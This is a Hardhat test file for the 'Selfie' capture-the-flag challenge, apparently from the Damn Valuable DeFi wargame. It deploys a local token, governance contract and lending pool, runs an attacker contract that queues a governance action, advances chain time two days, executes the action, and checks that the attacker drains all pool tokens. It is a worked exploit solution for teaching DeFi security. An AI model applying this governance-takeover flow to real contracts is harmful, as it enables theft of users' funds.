const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
        const SelfiePoolAttackerFactory = await ethers.getContractFactory('SelfiePoolAttacker', attacker);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        this.attackerContract = await SelfiePoolAttackerFactory.connect(attacker).deploy(
            this.pool.address,
            this.governance.address,
            this.token.address,
        );

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        let tx;
        let receipt;
        tx = await this.attackerContract.attack();
        receipt = await tx.wait();

        const logs = await this.governance.filters.ActionQueued(null, this.attackerContract.address);
        const [{ args: [actionId]}] = await this.governance.queryFilter(logs, 0);

        const TWO_DAYS = 2 * 24 * 60 * 60;
        await ethers.provider.send('evm_increaseTime', [TWO_DAYS]); 
        await ethers.provider.send('evm_mine');

        tx = await this.governance.executeAction(parseInt(actionId, 10));
        receipt = await tx.wait();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
